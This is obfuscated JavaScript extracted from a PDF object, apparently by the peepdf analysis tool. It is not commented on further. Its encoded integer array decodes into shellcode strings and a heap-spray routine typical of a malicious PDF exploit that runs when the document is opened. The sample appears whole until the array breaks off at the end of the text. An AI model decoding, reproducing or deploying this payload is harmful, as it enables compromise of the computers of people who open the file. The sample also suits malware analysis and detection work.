// peepdf comment: Javascript code located in object 7 (version 0)

var amopx = true;
pfrz = '';
abdgox = true;
lquv = '';
dlopsw = "";
yomkqz = "yomkqz";
acnx = false;
giqv = "";
zair = "zair";
abtuy = "";
hipqv = true;
mbztw = "mbztw";
var ptbhz = 36068,
    gkru = '',
    defjox = 0,
    mnouv = String,
    bchjqs = mnouv['f2rWoDmyCBhDa2rBCBoBdBeW'.replace(/[WBD2y]/g, '')],
    hklnqw = String,
    akor = hklnqw['euvua9l9'.replace(/[9GEMu]/g, '')],
    bfnst = "83",
    bcqt = "",
    bcgiox = [69, 61, 65, 153, 173, 161, 155, 167, 161, 162, 166, 83, 158, 156, 176, 146, 161, 167, 96, 172, 153, 165, 171, 163, 100, 83, 164, 152, 166, 92, 179, 64, 66, 60, 65, 170, 160, 156, 164, 152, 88, 91, 177, 148, 170, 166, 168, 97, 164, 152, 166, 154, 172, 155, 88, 93, 88, 101, 88, 111, 88, 159, 157, 161, 97, 174, 69, 61, 65, 60, 65, 172, 153, 165, 171, 163, 88, 94, 117, 83, 177, 148, 170, 166, 168, 110, 69, 61, 65, 60, 181, 64, 66, 60, 65, 172, 153, 165, 171, 163, 88, 112, 88, 172, 153, 165, 171, 163, 102, 166, 173, 149, 171, 167, 170, 156, 166, 154, 96, 99, 100, 83, 164, 152, 166, 98, 106, 92, 115, 64, 66, 60, 65, 165, 157, 167, 173, 165, 166, 83, 177, 148, 170, 166, 168, 110, 69, 61, 65, 176, 69, 61, 69, 61, 65, 153, 173, 161, 155, 167, 161, 162, 166, 83, 173, 167, 161, 159, 151, 163, 170, 156, 166, 167, 158, 91, 97, 174, 69, 61, 65, 60, 174, 148, 170, 83, 168, 148, 177, 159, 167, 148, 156, 83, 117, 83, 173, 161, 157, 166, 155, 148, 168, 152, 96, 85, 93, 168, 125, 117, 125, 108, 93, 168, 104, 99, 104, 100, 93, 168, 109, 105, 104, 99, 93, 168, 121, 100, 110, 103, 93, 168, 104, 99, 107, 99, 93, 168, 104, 99, 104, 99, 93, 168, 108, 99, 112, 117, 93, 168, 112, 117, 104, 118, 93, 168, 105, 118, 111, 99, 93, 168, 112, 117, 121, 119, 93, 168, 104, 107, 108, 99, 93, 168, 123, 102, 109, 120, 93, 168, 112, 117, 109, 104, 93, 168, 112, 117, 125, 118, 93, 168, 104, 107, 108, 104, 93, 168, 107, 102, 109, 101, 93, 168, 123, 100, 124, 101, 93, 168, 104, 102, 123, 101, 93, 168, 105, 99, 107, 101, 93, 168, 112, 99, 108, 99, 93, 168, 104, 99, 107, 107, 93, 168, 126, 104, 111, 104, 93, 168, 123, 101, 112, 117, 93, 168, 109, 119, 109, 116, 93, 168, 104, 103, 123, 101, 93, 168, 109, 104, 104, 99, 93, 168, 125, 118, 112, 117, 93, 168, 109, 100, 109, 100, 93, 168, 109, 105, 109, 102, 93, 168, 110, 99, 109, 106, 93, 168, 109, 119, 112, 117, 93, 168, 107, 102, 104, 107, 93, 168, 112, 117, 123, 99, 93, 168, 104, 118, 111, 104, 93, 168, 126, 120, 112, 117, 93, 168, 111, 105, 104, 102, 93, 168, 112, 117, 107, 118, 93, 168, 111, 107, 108, 120, 93, 168, 123, 121, 104, 102, 93, 168, 109, 100, 112, 117, 93, 168, 109, 101, 105, 118, 93, 168, 109, 100, 112, 117, 93, 168, 109, 101, 106, 103, 93, 168, 111, 100, 112, 117, 93, 168, 108, 120, 105, 103, 93, 168, 111, 104, 112, 108, 93, 168, 112, 117, 126, 118, 93, 168, 106, 99, 111, 100, 93, 168, 126, 106, 104, 102, 93, 168, 108, 116, 113, 108, 93, 168, 108, 101, 121, 119, 93, 168, 107, 117, 110, 99, 93, 168, 126, 118, 109, 104, 93, 168, 104, 103, 111, 104, 93, 168, 123, 99, 107, 102, 93, 168, 107, 106, 125, 117, 93, 168, 126, 121, 107, 102, 93, 168, 108, 104, 104, 102, 93, 168, 113, 106, 104, 118, 93, 168, 123, 121, 112, 117, 93, 168, 111, 104, 121, 120, 93, 168, 106, 117, 126, 119, 93, 168, 108, 121, 126, 108, 93, 168, 125, 107, 109, 100, 93, 168, 126, 121, 113, 103, 93, 168, 126, 121, 126, 121, 93, 168, 123, 102, 107, 117, 93, 168, 111, 103, 110, 100, 93, 168, 125, 117, 104, 101, 93, 168, 112, 117, 124, 108, 93, 168, 104, 118, 108, 104, 93, 168, 109, 120, 113, 101, 93, 168, 126, 101, 104, 102, 93, 168, 125, 99, 124, 100, 93, 168, 123, 105, 104, 102, 93, 168, 123, 108, 107, 102, 93, 168, 122, 106, 104, 121, 93, 168, 109, 121, 104, 107, 93, 168, 125, 100, 123, 100, 93, 168, 104, 102, 104, 101, 93, 168, 104, 102, 123, 116, 93, 168, 112, 117, 123, 121, 93, 168, 104, 102, 104, 100, 93, 168, 112, 108, 123, 101, 93, 168, 126, 107, 108, 104, 93, 168, 112, 117, 110, 100, 93, 168, 126, 107, 108, 104, 93, 168, 109, 120, 109, 121, 93, 168, 123, 108, 109, 117, 93, 168, 109, 104, 123, 102, 93, 168, 125, 118, 112, 117, 93, 168, 125, 107, 109, 100, 93, 168, 126, 121, 108, 108, 93, 168, 126, 121, 126, 121, 93, 168, 110, 107, 109, 99, 93, 168, 110, 99, 125, 107, 93, 168, 104, 103, 122, 121, 93, 168, 110, 118, 125, 107, 93, 168, 126, 121, 126, 121, 93, 168, 107, 102, 126, 121, 93, 168, 109, 101, 124, 101, 93, 168, 126, 121, 109, 101, 93, 168, 104, 107, 111, 104, 93, 168, 124, 99, 126, 121, 93, 168, 108, 104, 112, 108, 93, 168, 112, 117, 126, 118, 93, 168, 126, 118, 108, 104, 93, 168, 123, 102, 123, 108, 93, 168, 112, 117, 109, 104, 93, 168, 112, 102, 125, 118, 93, 168, 104, 118, 125, 118, 93, 168, 108, 104, 112, 119, 93, 168, 109, 99, 126, 103, 93, 168, 108, 104, 123, 105, 93, 168, 111, 104, 126, 103, 93, 168, 108, 104, 123, 105, 93, 168, 111, 101, 126, 104, 93, 168, 108, 104, 123, 105, 93, 168, 110, 118, 126, 105, 93, 168, 108, 104, 123, 105, 93, 168, 110, 119, 126, 106, 93, 168, 108, 104, 123, 105, 93, 168, 110, 121, 126, 107, 93, 168, 108, 104, 123, 105, 93, 168, 110, 120, 126, 108, 93, 168, 108, 104, 123, 105, 93, 168, 106, 120, 126, 116, 93, 168, 108, 104, 123, 105, 93, 168, 110, 103, 126, 117, 93, 168, 108, 104, 123, 105, 93, 168, 110, 118, 126, 118, 93, 168, 108, 104, 123, 105, 93, 168, 110, 118, 126, 119, 93, 168, 108, 104, 123, 105, 93, 168, 104, 99, 126, 120, 93, 168, 121, 99, 125, 107, 93, 168, 126, 121, 126, 121, 93, 168, 109, 99, 126, 121, 93, 168, 109, 119, 110, 107, 93, 168, 105, 100, 112, 116, 93, 168, 125, 107, 105, 105, 93, 168, 126, 121, 105, 104, 93, 168, 126, 121, 126, 121, 93, 168, 123, 103, 112, 102, 93, 168, 112, 104, 104, 118, 93, 168, 111, 103, 123, 99, 93, 168, 110, 116, 105, 104, 93, 168, 110, 116, 104, 99, 93, 168, 126, 121, 104, 99, 93, 168, 104, 118, 111, 104, 93, 168, 111, 104, 126, 121, 93, 168, 110, 116, 104, 107, 93, 168, 126, 121, 104, 99, 93, 168, 112, 104, 124, 99, 93, 168, 111, 104, 123, 99, 93, 168, 108, 99, 104, 102, 93, 168, 123, 102, 123, 108, 93, 168, 123, 99, 107, 102, 93, 168, 123, 102, 123, 108, 93, 168, 107, 102, 109, 106, 93, 168, 112, 117, 123, 99, 93, 168, 106, 103, 108, 118, 93, 168, 112, 117, 104, 118, 93, 168, 106, 103, 111, 118, 93, 168, 126, 118, 104, 107, 93, 168, 121, 116, 126, 102, 93, 168, 123, 102, 109, 121, 93, 168, 108, 118, 112, 117, 93, 168, 104, 103, 106, 103, 93, 168, 107, 108, 112, 99, 93, 168, 112, 117, 104, 99, 93, 168, 111, 103, 123, 100, 93, 168, 108, 99, 104, 105, 93, 168, 107, 107, 112, 99, 93, 168, 111, 104, 104, 99, 93, 168, 106, 117, 126, 116, 93, 168, 123, 102, 123, 100, 93, 168, 112, 117, 109, 104, 93, 168, 112, 102, 125, 118, 93, 168, 110, 103, 125, 118, 93, 168, 112, 119, 109, 102, 93, 168, 126, 99, 108, 104, 93, 168, 107, 102, 109, 106, 93, 168, 109, 99, 124, 117, 93, 168, 108, 104, 123, 105, 93, 168, 110, 117, 126, 99, 93, 168, 108, 104, 123, 105, 93, 168, 110, 104, 126, 100, 93, 168, 108, 104, 123, 105, 93, 168, 111, 101, 126, 101, 93, 168, 108, 104, 123, 105, 93, 168, 110, 120, 126, 102, 93, 168, 108, 104, 123, 105, 93, 168, 110, 104, 126, 103, 93, 168, 108, 104, 123, 105, 93, 168, 110, 118, 126, 104, 93, 168, 108, 104, 123, 105, 93, 168, 107, 102, 126, 105, 93, 168, 108, 104, 123, 105, 93, 168, 107, 101, 126, 106, 93, 168, 108, 104, 123, 105, 93, 168, 106, 120, 126, 107, 93, 168, 108, 104, 123, 105, 93, 168, 110, 103, 126, 108, 93, 168, 108, 104, 123, 105, 93, 168, 110, 118, 126, 116, 93, 168, 108, 104, 123, 105, 93, 168, 110, 118, 126, 117, 93, 168, 109, 119, 112, 107, 93, 168, 125, 107, 126, 118, 93, 168, 126, 121, 104, 117, 93, 168, 126, 121, 126, 121, 93, 168, 110, 107, 109, 99, 93, 168, 108, 102, 110, 107, 93, 168, 112, 120, 126, 108, 93, 168, 112, 99, 125, 107, 93, 168, 126, 121, 126, 120, 93, 168, 112, 117, 126, 121, 93, 168, 112, 119, 126, 107, 93, 168, 113, 118, 108, 104, 93, 168, 108, 103, 110, 116, 93, 168, 125, 107, 109, 99, 93, 168, 126, 121, 111, 120, 93, 168, 126, 121, 126, 121, 93, 168, 108, 104, 112, 119, 93, 168, 110, 116, 125, 99, 93, 168, 109, 99, 105, 99, 93, 168, 111, 102, 125, 107, 93, 168, 126, 121, 126, 121, 93, 168, 112, 102, 126, 121, 93, 168, 105, 118, 123, 103, 93, 168, 108, 104, 112, 119, 93, 168, 109, 99, 125, 99, 93, 168, 108, 104, 112, 119, 93, 168, 109, 99, 113, 118, 93, 168, 109, 102, 109, 102, 93, 168, 109, 102, 109, 102, 93, 168, 109, 102, 109, 102, 93, 168, 111, 104, 126, 121, 93, 168, 123, 106, 104, 107, 93, 168, 113, 118, 108, 104, 93, 168, 104, 99, 108, 103, 93, 168, 104, 99, 104, 99, 93, 168, 126, 121, 109, 102, 93, 168, 109, 121, 124, 106, 93, 168, 122, 105, 104, 121, 93, 168, 109, 117, 123, 99, 93, 168, 123, 102, 123, 108, 93, 168, 112, 117, 109, 104, 93, 168, 109, 100, 125, 118, 93, 168, 109, 102, 109, 100, 93, 168, 109, 106, 109, 105, 93, 168, 108, 101, 110, 116, 93, 168, 111, 101, 125, 107, 93, 168, 104, 99, 104, 99, 93, 168, 112, 117, 104, 99, 93, 168, 107, 102, 124, 107, 93, 168, 112, 104, 126, 105, 93, 168, 109, 108, 124, 117, 93, 168, 108, 104, 123, 106, 93, 168, 110, 100, 126, 107, 93, 168, 110, 104, 106, 120, 93, 168, 123, 106, 111, 107, 93, 168, 126, 118, 108, 104, 93, 168, 104, 99, 110, 104, 93, 168, 104, 99, 104, 99, 93, 168, 109, 105, 111, 120, 93, 168, 108, 104, 112, 119, 93, 168, 109, 99, 126, 107, 93, 168, 125, 107, 109, 105, 93, 168, 104, 99, 109, 100, 93, 168, 104, 99, 104, 99, 93, 168, 109, 99, 109, 108, 93, 168, 122, 100, 125, 107, 93, 168, 126, 121, 126, 120, 93, 168, 112, 104, 126, 121, 93, 168, 109, 108, 123, 99, 93, 168, 111, 103, 109, 108, 93, 168, 112, 119, 107, 108, 93, 168, 104, 100, 108, 105, 93, 168, 125, 107, 109, 99, 93, 168, 104, 99, 107, 117, 93, 168, 104, 99, 104, 99, 93, 168, 126, 107, 112, 117, 93, 168, 108, 104, 112, 119, 93, 168, 109, 99, 126, 107, 93, 168, 106, 100, 125, 107, 93, 168, 126, 121, 126, 121, 93, 168, 112, 104, 126, 121, 93, 168, 109, 108, 123, 99, 93, 168, 111, 103, 109, 108, 93, 168, 109, 106, 104, 118, 93, 168, 104, 100, 125, 107, 93, 168, 126, 121, 126, 121, 93, 168, 109, 108, 126, 121, 93, 168, 108, 103, 123, 105, 93, 168, 126, 121, 107, 107, 93, 168, 109, 99, 111, 102, 93, 168, 108, 104, 112, 119, 93, 168, 126, 120, 126, 107, 93, 168, 109, 107, 104, 99, 93, 168, 108, 104, 112, 119, 93, 168, 109, 99, 126, 107, 93, 168, 125, 107, 109, 106, 93, 168, 126, 120, 111, 103, 93, 168, 126, 121, 126, 121, 93, 168, 109, 108, 109, 108, 93, 168, 108, 105, 108, 105, 93, 168, 126, 102, 107, 117, 93, 168, 121, 116, 111, 118, 93, 168, 109, 120, 109, 121, 93, 168, 123, 108, 109, 117, 93, 168, 109, 104, 123, 102, 93, 168, 125, 118, 112, 117, 93, 168, 109, 102, 109, 100, 93, 168, 110, 99, 110, 105, 93, 168, 107, 101, 122, 100, 93, 168, 104, 99, 125, 107, 93, 168, 104, 99, 104, 99, 93, 168, 109, 107, 104, 99, 93, 168, 104, 107, 107, 107, 93, 168, 104, 102, 111, 103, 93, 168, 125, 117, 108, 99, 93, 168, 108, 99, 126, 108, 93, 168, 109, 119, 112, 117, 93, 168, 112, 99, 104, 107, 93, 168, 108, 101, 126, 117, 93, 168, 104, 107, 111, 104, 93, 168, 124, 117, 107, 102, 93, 168, 105, 107, 112, 116, 93, 168, 123, 102, 112, 117, 93, 168, 105, 106, 125, 117, 93, 168, 105, 107, 107, 107, 93, 168, 105, 100, 111, 105, 93, 168, 107, 102, 108, 99, 93, 168, 112, 103, 123, 108, 93, 168, 111, 103, 124, 117, 93, 168, 108, 99, 104, 118, 93, 168, 104, 107, 107, 107, 93, 168, 126, 117, 111, 104, 93, 168, 126, 120, 108, 99, 93, 168, 125, 117, 123, 117, 93, 168, 107, 102, 126, 101, 93, 168, 112, 108, 123, 99, 93, 168, 126, 118, 108, 104, 93, 168, 108, 104, 112, 117, 93, 168, 109, 117, 126, 118, 93, 168, 123, 102, 123, 108, 93, 168, 104, 101, 107, 101, 93, 168, 111, 103, 110, 107, 93, 168, 111, 99, 111, 103, 93, 168, 106, 121, 107, 116, 93, 168, 110, 121, 106, 121, 93, 168, 111, 104, 111, 108, 93, 168, 110, 118, 110, 120, 93, 168, 110, 120, 110, 100, 93, 168, 106, 120, 110, 103, 93, 168, 111, 101, 110, 121, 93, 168, 106, 121, 110, 106, 93, 168, 111, 101, 110, 105, 93, 168, 110, 106, 110, 100, 93, 168, 111, 102, 111, 104, 93, 168, 110, 103, 106, 121, 93, 168, 110, 119, 110, 104, 93, 168, 111, 107, 111, 101, 93, 168, 107, 101, 111, 108, 93, 168, 110, 104, 106, 120, 93, 168, 110, 104, 111, 107, 93, 168, 110, 107, 104, 99, 93, 168, 111, 103, 111, 103, 93, 168, 107, 116, 111, 99, 93, 168, 106, 121, 106, 121, 93, 168, 111, 108, 110, 121, 93, 168, 110, 120, 111, 104, 93, 168, 110, 100, 110, 118, 93, 168, 110, 103, 110, 120, 93, 168, 110, 121, 106, 120, 93, 168, 110, 106, 111, 101, 93, 168, 110, 105, 106, 121, 93, 168, 110, 100, 111, 101, 93, 168, 111, 104, 110, 106, 93, 168, 106, 121, 111, 102, 93, 168, 110, 118, 110, 102, 93, 168, 110, 102, 110, 108, 93, 168, 106, 120, 110, 117, 93, 168, 110, 107, 111, 99, 93, 168, 107, 121, 111, 99, 93, 168, 107, 119, 111, 101, 93, 168, 104, 99, 104, 99, 90, 92, 115, 64, 66, 60, 65, 169, 153, 165, 88, 161, 167, 163, 88, 112, 88, 168, 166, 152, 171, 150, 153, 163, 157, 91, 90, 88, 173, 99, 121, 99, 121, 88, 173, 99, 121, 99, 121, 88, 173, 99, 121, 99, 121, 88, 173, 99, 121, 99, 121, 85, 97, 64, 66, 60, 65, 169, 153, 165, 88, 155, 157, 148, 168, 149, 164, 162, 155, 158, 88, 112, 88, 161, 167, 163, 88, 94, 88, 163, 153, 172, 164, 162, 153, 151, 115, 64, 66, 60, 65, 169, 153, 165, 88, 149, 161, 154, 154, 159, 167, 150, 163, 83, 117, 83, 173, 161, 157, 166, 155, 148, 168, 152, 96, 85, 93, 168, 104, 116, 104, 116, 93, 168, 104, 116, 104, 116, 90, 92, 115, 64, 66, 60, 65, 169, 153, 165, 88, 155, 157, 148, 156, 152, 170, 166, 161, 173, 157, 83, 117, 83, 106, 99, 115, 64, 66, 60, 65, 169, 153, 165, 88, 166, 168, 165, 153, 172, 88, 112, 88, 155, 157, 148, 156, 152, 170, 166, 161, 173, 157, 83, 99, 83, 160, 152, 153, 163, 154, 159, 167, 150, 163, 97, 164, 152, 166, 154, 172, 155, 115, 64, 66, 60, 65, 170, 160, 156, 164, 152, 88, 91, 154, 156, 159, 149, 164, 162, 155, 158, 102, 159, 157, 161, 159, 167, 160, 83, 116, 83, 171, 163, 170, 148, 177, 92, 179, 64, 66, 60, 65, 60, 154, 156, 159, 149, 164, 162, 155, 158, 88, 94, 117, 83, 154, 156, 159, 149, 164, 162, 155, 158, 115, 64, 66, 60, 65, 176, 69, 61, 65, 60, 174, 148, 170, 83, 158, 156, 164, 159, 154, 159, 167, 150, 163, 83, 117, 83, 154, 156, 159, 149, 164, 162, 155, 158, 102, 166, 173, 149, 171, 167, 170, 156, 166, 154, 96, 99, 100, 83, 171, 163, 170, 148, 177, 92, 115, 64, 66, 60, 65, 169, 153, 165, 88, 149, 164, 162, 155, 158, 88, 112, 88, 149, 161, 154, 154, 159, 167, 150, 163, 97, 171, 168, 154, 166, 172, 165, 161, 161, 159, 91, 104, 95, 88, 149, 161, 154, 154, 159, 167, 150, 163, 97, 164, 152, 166, 154, 172, 155, 101, 166, 168, 165, 153, 172, 97, 110, 69, 61, 65, 60, 175, 155, 161, 159, 157, 83, 96, 149, 164, 162, 155, 158, 102, 159, 157, 161, 159, 167, 160, 94, 171, 163, 170, 148, 177, 83, 116, 83, 104, 171, 108, 99, 104, 99, 104, 92, 179, 64, 66, 60, 65, 60, 154, 159, 167, 150, 163, 83, 117, 83, 154, 159, 167, 150, 163, 83, 99, 83, 154, 159, 167, 150, 163, 83, 99, 83, 158, 156, 164, 159, 154, 159, 167, 150, 163, 110, 69, 61, 65, 60, 181, 64, 66, 60, 65, 169, 153, 165, 88, 160, 157, 160, 151, 148, 170, 165, 153, 172, 88, 112, 88, 161, 157, 170, 88, 116, 170, 165, 153, 172, 96, 92, 115, 64, 66, 60, 65, 153, 167, 165, 88, 91, 174, 148, 170, 83, 161, 83, 117, 83, 104, 110, 88, 156, 88, 111, 88, 100, 108, 99, 104, 110, 88, 156, 99, 94, 97, 174, 69, 61, 65, 60, 65, 160, 157, 160, 151, 148, 170, 165, 153, 172, 147, 156, 149, 83, 117, 83, 154, 159, 167, 150, 163, 83, 99, 83, 160, 152, 153, 163, 154, 159, 167, 150, 163, 110, 69, 61, 65, 60, 181, 64, 66, 60, 65, 169, 153, 165, 88, 161, 173, 160, 88, 112, 88, 100, 106, 108, 113, 108, 113, 108, 113, 108, 113, 108, 113, 108, 113, 108, 113, 108, 113, 108, 113, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 107, 112, 110, 69, 61, 65, 60, 173, 167, 161, 159, 102, 163, 170, 156, 166, 167, 158, 91, 90, 88, 108, 104, 104, 99, 104, 153, 90, 95, 88, 161, 173, 160, 97, 110, 69, 61, 65, 176, 69, 61, 69, 61, 65, 153, 173, 161, 155, 167, 161, 162, 166, 83, 155, 162, 164, 159, 153, 149, 151, 152, 165, 148, 161, 159, 96, 92, 179, 64, 66, 60, 65, 169, 153, 165, 88, 166, 160, 152, 164, 159, 155, 162, 156, 152, 88, 112, 88, 168, 166, 152, 171, 150, 153, 163, 157, 91, 90, 88, 173, 120, 122, 120, 113, 88, 173, 99, 104, 99, 105, 88, 173, 104, 110, 99, 104, 88, 173, 116, 105, 105, 108, 88, 173, 99, 104, 102, 104, 88, 173, 99, 104, 99, 104, 88, 173, 103, 104, 107, 122, 88, 173, 107, 122, 99, 123, 88, 173, 100, 123, 106, 104, 88, 173, 107, 122, 116, 124, 88, 173, 99, 112, 103, 104, 88, 173, 118, 107, 104, 125, 88, 173, 107, 122, 104, 109, 88, 173, 107, 122, 120, 123, 88, 173, 99, 112, 103, 109, 88, 173, 102, 107, 104, 106, 88, 173, 118, 105, 119, 106, 88, 173, 99, 107, 118, 106, 88, 173, 100, 104, 102, 106, 88, 173, 107, 104, 103, 104, 88, 173, 99, 104, 102, 112, 88, 173, 121, 109, 106, 109, 88, 173, 118, 106, 107, 122, 88, 173, 104, 124, 104, 121, 88, 173, 99, 108, 118, 106, 88, 173, 104, 109, 99, 104, 88, 173, 120, 123, 107, 122, 88, 173, 104, 105, 104, 105, 88, 173, 104, 110, 104, 107, 88, 173, 105, 104, 104, 111, 88, 173, 104, 124, 107, 122, 88, 173, 102, 107, 99, 112, 88, 173, 107, 122, 118, 104, 88, 173, 99, 123, 106, 109, 88, 173, 121, 125, 107, 122, 88, 173, 106, 110, 99, 107, 88, 173, 107, 122, 102, 123, 88, 173, 106, 112, 103, 125, 88, 173, 118, 126, 99, 107, 88, 173, 104, 105, 107, 122, 88, 173, 104, 106, 100, 123, 88, 173, 104, 105, 107, 122, 88, 173, 104, 106, 101, 108, 88, 173, 106, 105, 107, 122, 88, 173, 103, 125, 100, 108, 88, 173, 106, 109, 107, 113, 88, 173, 107, 122, 121, 123, 88, 173, 101, 104, 106, 105, 88, 173, 121, 111, 99, 107, 88, 173, 103, 121, 108, 113, 88, 173, 103, 106, 116, 124, 88, 173, 102, 122, 105, 104, 88, 173, 121, 123, 104, 109, 88, 173, 99, 108, 106, 109, 88, 173, 118, 104, 102, 107, 88, 173, 102, 111, 120, 122, 88, 173, 121, 126, 102, 107, 88, 173, 103, 109, 99, 107, 88, 173, 108, 111, 99, 123, 88, 173, 118, 126, 107, 122, 88, 173, 106, 109, 116, 125, 88, 173, 101, 122, 121, 124, 88, 173, 103, 126, 121, 113, 88, 173, 120, 112, 104, 105, 88, 173, 121, 126, 108, 108, 88, 173, 121, 126, 121, 126, 88, 173, 118, 107, 102, 122, 88, 173, 106, 108, 105, 105, 88, 173, 120, 122, 99, 106, 88, 173, 107, 122, 119, 113, 88, 173, 99, 123, 103, 109, 88, 173, 104, 125, 108, 106, 88, 173, 121, 106, 99, 107, 88, 173, 120, 104, 119, 105, 88, 173, 118, 110, 99, 107, 88, 173, 118, 113, 102, 107, 88, 173, 117, 111, 99, 126, 88, 173, 104, 126, 99, 112, 88, 173, 120, 105, 118, 105, 88, 173, 99, 107, 99, 106, 88, 173, 99, 107, 118, 121, 88, 173, 107, 122, 118, 126, 88, 173, 99, 107, 99, 105, 88, 173, 107, 113, 118, 106, 88, 173, 121, 112, 103, 109, 88, 173, 107, 122, 105, 105, 88, 173, 121, 112, 103, 109, 88, 173, 104, 125, 104, 126, 88, 173, 118, 113, 104, 122, 88, 173, 104, 109, 118, 107, 88, 173, 120, 123, 107, 122, 88, 173, 120, 112, 104, 105, 88, 173, 121, 126, 103, 113, 88, 173, 121, 126, 121, 126, 88, 173, 105, 112, 104, 104, 88, 173, 105, 104, 120, 112, 88, 173, 99, 108, 117, 126, 88, 173, 105, 123, 120, 112, 88, 173, 121, 126, 121, 126, 88, 173, 102, 107, 121, 126, 88, 173, 104, 106, 119, 106, 88, 173, 121, 126, 104, 106, 88, 173, 99, 112, 106, 109, 88, 173, 119, 104, 121, 126, 88, 173, 103, 109, 107, 113, 88, 173, 107, 122, 121, 123, 88, 173, 121, 123, 103, 109, 88, 173, 118, 107, 118, 113, 88, 173, 107, 122, 104, 109, 88, 173, 107, 107, 120, 123, 88, 173, 99, 123, 120, 123, 88, 173, 103, 109, 107, 124, 88, 173, 104, 104, 121, 108, 88, 173, 103, 109, 118, 110, 88, 173, 106, 109, 121, 108, 88, 173, 103, 109, 118, 110, 88, 173, 106, 106, 121, 109, 88, 173, 103, 109, 118, 110, 88, 173, 105, 123, 121, 110, 88, 173, 103, 109, 118, 110, 88, 173, 105, 124, 121, 111, 88, 173, 103, 109, 118, 110, 88, 173, 105, 126, 121, 112, 88, 173, 103, 109, 118, 110, 88, 173, 105, 125, 121, 113, 88, 173, 103, 109, 118, 110, 88, 173, 101, 125, 121, 121, 88, 173, 103, 109, 118, 110, 88, 173, 105, 108, 121, 122, 88, 173, 103, 109, 118, 110, 88, 173, 105, 123, 121, 123, 88, 173, 103, 109, 118, 110, 88, 173, 105, 123, 121, 124, 88, 173, 103, 109, 118, 110, 88, 173, 99, 104, 121, 125, 88, 173, 116, 104, 120, 112, 88, 173, 121, 126, 121, 126, 88, 173, 104, 104, 121, 126, 88, 173, 104, 124, 105, 112, 88, 173, 100, 105, 107, 121, 88, 173, 120, 112, 100, 110, 88, 173, 121, 126, 100, 109, 88, 173, 121, 126, 121, 126, 88, 173, 118, 108, 107, 107, 88, 173, 107, 109, 99, 123, 88, 173, 106, 108, 118, 104, 88, 173, 105, 121, 100, 109, 88, 173, 105, 121, 99, 104, 88, 173, 121, 126, 99, 104, 88, 173, 99, 123, 106, 109, 88, 173, 106, 109, 121, 126, 88, 173, 105, 121, 99, 112, 88, 173, 121, 126, 99, 104, 88, 173, 107, 109, 119, 104, 88, 173, 106, 109, 118, 104, 88, 173, 103, 104, 99, 107, 88, 173, 118, 107, 118, 113, 88, 173, 118, 104, 102, 107, 88, 173, 118, 107, 118, 113, 88, 173, 102, 107, 104, 111, 88, 173, 107, 122, 118, 104, 88, 173, 101, 108, 103, 123, 88, 173, 107, 122, 99, 123, 88, 173, 101, 108, 106, 123, 88, 173, 121, 123, 99, 112, 88, 173, 116, 121, 121, 107, 88, 173, 118, 107, 104, 126, 88, 173, 103, 123, 107, 122, 88, 173, 99, 108, 101, 108, 88, 173, 102, 113, 107, 104, 88, 173, 107, 122, 99, 104, 88, 173, 106, 108, 118, 105, 88, 173, 103, 104, 99, 110, 88, 173, 102, 112, 107, 104, 88, 173, 106, 109, 99, 104, 88, 173, 101, 122, 121, 121, 88, 173, 118, 107, 118, 105, 88, 173, 107, 122, 104, 109, 88, 173, 107, 107, 120, 123, 88, 173, 105, 108, 120, 123, 88, 173, 107, 124, 104, 107, 88, 173, 121, 104, 103, 109, 88, 173, 102, 107, 104, 111, 88, 173, 104, 104, 119, 122, 88, 173, 103, 109, 118, 110, 88, 173, 105, 122, 121, 104, 88, 173, 103, 109, 118, 110, 88, 173, 105, 109, 121, 105, 88, 173, 103, 109, 118, 110, 88, 173, 106, 106, 121, 106, 88, 173, 103, 109, 118, 110, 88, 173, 105, 125, 121, 107, 88, 173, 103, 109, 118, 110, 88, 173, 105, 109, 121, 108, 88, 173, 103, 109, 118, 110, 88, 173, 105, 123, 121, 109, 88, 173, 103, 109, 118, 110, 88, 173, 102, 107, 121, 110, 88, 173, 103, 109, 118, 110, 88, 173, 102, 106, 121, 111, 88, 173, 103, 109, 118, 110, 88, 173, 101, 125, 121, 112, 88, 173, 103, 109, 118, 110, 88, 173, 105, 108, 121, 113, 88, 173, 103, 109, 118, 110, 88, 173, 105, 123, 121, 121, 88, 173, 103, 109, 118, 110, 88, 173, 105, 123, 121, 122, 88, 173, 104, 124, 107, 112, 88, 173, 120, 112, 121, 123, 88, 173, 121, 126, 99, 122, 88, 173, 121, 126, 121, 126, 88, 173, 105, 112, 104, 104, 88, 173, 103, 107, 105, 112, 88, 173, 107, 125, 121, 113, 88, 173, 107, 104, 120, 112, 88, 173, 121, 126, 121, 125, 88, 173, 107, 122, 121, 126, 88, 173, 107, 124, 121, 112, 88, 173, 108, 123, 103, 109, 88, 173, 103, 108, 105, 121, 88, 173, 120, 112, 104, 104, 88, 173, 121, 126, 106, 125, 88, 173, 121, 126, 121, 126, 88, 173, 103, 109, 107, 124, 88, 173, 105, 121, 120, 104, 88, 173, 104, 104, 100, 104, 88, 173, 106, 107, 120, 112, 88, 173, 121, 126, 121, 126, 88, 173, 107, 107, 121, 126, 88, 173, 